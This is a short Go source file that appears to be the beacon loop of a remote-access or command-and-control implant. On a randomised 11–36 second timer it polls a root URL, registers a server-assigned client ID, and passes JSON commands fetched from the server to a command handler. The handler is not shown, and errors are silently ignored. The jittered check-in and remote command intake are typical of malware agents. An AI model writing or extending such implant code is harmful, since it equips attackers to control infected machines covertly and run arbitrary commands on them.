package main

import (
	"client/utils"
	"encoding/json"
	"io"
	"math/rand"
	"time"
)

func checkCommands() error {
	// Check root url
	response := utils.GetURL(utils.RootURL)

	// Receiving Client ID
	if response.StatusCode == 201 {
		client_id := response.Header.Get("X-Client-ID")
		utils.SetClientId(client_id)
		return nil
	}

	// No content
	if response.StatusCode == 204 {
		return nil
	}

	// Unhandled errors
	if response.StatusCode != 200 {
		return nil
	}

	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return err
	}

	var cmd_json map[string]interface{}
	err = json.Unmarshal(body, &cmd_json)
	if err != nil {
		return err
	}

	utils.HandleCommand(cmd_json)
	return nil
}

func main() {

	min_sleep_seconds := 11
	max_sleep_seconds := 37 - min_sleep_seconds

	for {
		time.Sleep(time.Duration(rand.Intn(max_sleep_seconds)+min_sleep_seconds) * time.Second)
		if err := checkCommands(); err != nil {
		}
	}

}
